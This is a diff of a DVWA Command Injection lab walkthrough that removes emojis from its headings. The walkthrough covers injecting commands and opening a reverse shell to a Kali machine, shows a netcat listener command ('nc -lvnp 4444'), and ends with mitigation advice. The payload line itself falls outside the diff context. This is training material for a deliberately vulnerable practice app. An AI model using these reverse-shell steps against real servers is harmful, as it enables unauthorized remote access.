@@ -1,6 +1,6 @@
-# 🔥 DVWA Remote Code Execution (RCE) Walkthrough
+#  DVWA Remote Code Execution (RCE) Walkthrough
 
-# 📌 **Overview**
+#  **Overview**
 
 Remote Code Execution (RCE) is one of the most dangerous web vulnerabilities. It allows an attacker to execute system commands directly on the target server.
 
@@ -15,7 +15,7 @@ In DVWA, the **Command Injection** module simulates this vulnerability. This wal
 
 ---
 
-# 🚀 **Environment Setup**
+#  **Environment Setup**
 
 * **Target:** DVWA running on localhost or VM
 * **Attacker Machine:** Kali Linux
@@ -27,18 +27,18 @@ In DVWA, the **Command Injection** module simulates this vulnerability. This wal
 
 ---
 
-# 🧩 **1. Navigate to the Command Injection Module**
+#  **1. Navigate to the Command Injection Module**
 
 DVWA Sidebar → Vulnerabilities → **Command Injection**
 
 On this page, DVWA asks for an IP address to ping.
 
-> 📸 **<img width="652" height="664" alt="image" src="https://github.com/user-attachments/assets/ec1fe8db-ace9-4442-9598-0eae809e6e08" />
+>  **<img width="652" height="664" alt="image" src="https://github.com/user-attachments/assets/ec1fe8db-ace9-4442-9598-0eae809e6e08" />
 ** *Command Injection module interface*
 
 ---
 
-# 🧪 **2. Identify the Injection Point**
+#  **2. Identify the Injection Point**
 
 The input box is supposed to only accept IP addresses, but DVWA fails to sanitize the input.
 
@@ -50,12 +50,12 @@ You can test command execution using:
 
 If the server executes the `whoami` command, the output appears below the form.
 
-> 📸 **<img width="847" height="463" alt="image" src="https://github.com/user-attachments/assets/d6ed125d-677c-4e2c-b696-c7273fe40682" />
+>  **<img width="847" height="463" alt="image" src="https://github.com/user-attachments/assets/d6ed125d-677c-4e2c-b696-c7273fe40682" />
 ** *Successful command injection output*
 
 ---
 
-# 💥 **3. Execute Arbitrary System Commands**
+#  **3. Execute Arbitrary System Commands**
 
 Try running more commands:
 
@@ -67,12 +67,12 @@ Try running more commands:
 
 Each one should return system-level information.
 
-> 📸 **<img width="857" height="370" alt="image" src="https://github.com/user-attachments/assets/da351b1b-a9aa-496b-a546-956305c72e98" />
+>  **<img width="857" height="370" alt="image" src="https://github.com/user-attachments/assets/da351b1b-a9aa-496b-a546-956305c72e98" />
 ** *Command execution results*
 
 ---
 
-# 🧨 **4. Prepare a Reverse Shell Listener (Kali)**
+#  **4. Prepare a Reverse Shell Listener (Kali)**
 
 On Kali Linux, open a listener:
 
@@ -80,12 +80,12 @@ On Kali Linux, open a listener:
 nc -lvnp 4444
 ```
 
-> 📸 **<img width="353" height="40" alt="image" src="https://github.com/user-attachments/assets/5475d8f9-4aa8-4a38-9ad2-ad3c550b63bc" />
+>  **<img width="353" height="40" alt="image" src="https://github.com/user-attachments/assets/5475d8f9-4aa8-4a38-9ad2-ad3c550b63bc" />
 ** *Netcat listener on Kali*
 
 ---
 
-# 🔗 **5. Execute the Reverse Shell Payload on DVWA**
+#  **5. Execute the Reverse Shell Payload on DVWA**
 
 Use this payload in DVWA:
 
@@ -97,12 +97,12 @@ Replace `YOUR_KALI_IP` with your actual IP.
 
 If the environment and network allow outbound connections, the server will connect back to your Kali machine.
 
-> 📸 **<img width="651" height="316" alt="image" src="https://github.com/user-attachments/assets/67f3e574-ca89-419c-b0aa-92aebef45b6c" />
+>  **<img width="651" height="316" alt="image" src="https://github.com/user-attachments/assets/67f3e574-ca89-419c-b0aa-92aebef45b6c" />
 ** *Successful reverse shell connection*
 
 ---
 
-# 💻 **6. Verify Interactive Remote Shell Access**
+#  **6. Verify Interactive Remote Shell Access**
 
 If the exploit succeeds, your Kali terminal now becomes a shell on the DVWA machine.
 
@@ -117,19 +117,19 @@ ls
 
 ---
 
-# 🛡️ **Mitigation & Prevention**
+#  **Mitigation & Prevention**
 
 To prevent RCE vulnerabilities:
 
-### ✔ Input Validation
+###  Input Validation
 
 Use allowlists — only accept expected patterns.
 
-### ✔ Command Sanitization
+###  Command Sanitization
 
 Never pass user input into system commands without strict filtering.
 
-### ✔ Disable System Command Operators
+###  Disable System Command Operators
 
 Remove direct execution functions like:
 
@@ -138,17 +138,17 @@ Remove direct execution functions like:
 * `shell_exec()`
 * `popen()`
 
-### ✔ Use Prepared Statements / Safe APIs
+###  Use Prepared Statements / Safe APIs
 
 Avoid direct shell interactions.
 
-### ✔ Implement a Web Application Firewall (WAF)
+###  Implement a Web Application Firewall (WAF)
 
 Blocks malicious patterns automatically.
 
 ---
 
-# 📝 **Conclusion**
+#  **Conclusion**
 
 This walkthrough demonstrates how improper input sanitization leads to full system compromise. DVWA makes it easy to practice, but the same vulnerability in a real system would be catastrophic.
 
@@ -156,7 +156,7 @@ Feel free to customize this documentation and insert your screenshots in the pro
 
 ---
 
-# 👤 **Author**
+#  **Author**
 
 **Suleiman Zainab**
 Your offensive security learning journey continues 🚀💻
